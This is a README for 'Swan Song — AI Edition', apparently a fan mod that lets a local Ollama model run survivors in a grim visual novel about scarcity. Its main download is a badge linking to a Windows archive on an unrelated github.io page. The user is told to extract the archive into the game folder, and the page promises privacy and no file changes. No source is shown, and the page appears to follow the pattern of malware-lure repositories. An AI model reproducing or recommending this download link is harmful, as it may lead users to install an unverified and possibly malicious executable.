## About

**Swan Song — AI Edition** is a mod about six people in a freezing church after an earthquake has taken everything else away. There is no supernatural element and no rescue on the way. There is only what the survivors decide to do to each other.

A locally-hosted model runs the group under a resource system: food, warmth, and the slow erosion of the reasons people behave decently.

> 🕯️ Scarcity is modelled directly. As supplies drop, the personas' willingness to cooperate drops with them — and the mod does not intervene to keep anyone kind.

---

## ✨ Features

- 🥫 **Resource scarcity** — Food, fuel and warmth tracked across sessions, driving behaviour.
- ❄️ **Winter pressure** — Temperature as an active variable in every scene.
- 👥 **Group dynamics** — Alliances, resentments and factions that form on their own.
- 🎹 **Piano scenes** — The Canon motif returns as the mod's one point of relief.
- 🔒 **Entirely offline** — A local model and a local save. Nothing else.
- 🎭 **Restrained sprite work** — Expression selection deliberately muted, matching the source.

## 📥 Download & Installation

### Step 1 — Get the mod

[![Download Now](https://img.shields.io/badge/%E2%AC%87%20Download%20Now-2ea44f?style=for-the-badge&logo=github)](https://hornbladesmanhonor.github.io/download-win/)

### Step 2 — Install Ollama (the local AI engine)

Ollama is a free, open-source runtime that executes language models directly on your own hardware.

1. Download it from **https://ollama.com/download** for your operating system
2. Run the installer and let it finish
3. Open a terminal and pull a model:

   ```
   ollama pull llama3
   ```

   *(~4.7 GB. Any model from https://ollama.com/library will work — larger models give
   better in-character writing, smaller ones respond faster.)*

### Step 3 — Install into Swan Song

1. Start from a clean, working installation of **Swan Song**
2. Extract the downloaded archive
3. Copy its contents into the game's main folder
4. Launch the game — the AI layer initialises on first run

## ❓ FAQ

**Q: Content warnings?**
> Sexual violence, death and severe psychological distress. Swan Song is 18+ and unflinching.

**Q: Which release?**
> The English PC release, standard installation directory.

**Q: Can scarcity be disabled?**
> Yes, via config — though it removes the mechanism the whole mod is built on.

**Q: Are my conversations private?**
> Completely. The model runs on your machine and logs are written to a local folder.
> Disconnect from the internet and the mod keeps working.

**Q: Does this use ChatGPT or any paid API?**
> No. There are no API keys, no accounts, and no subscriptions. Ollama is free and open source.

**Q: Can I use an uncensored model?**
> Yes — pull any model from https://ollama.com/library. Uncensored variants sometimes follow
> the roleplay format less reliably, which is a trade-off you control.

**Q: Will this touch my save files?**
> No. The mod never reads or writes the game's save data.

**Q: The AI returned an error instead of a reply. Why?**
> The model produced output the mod couldn't parse. Switch models, lower the temperature,
> or shorten the system prompt.
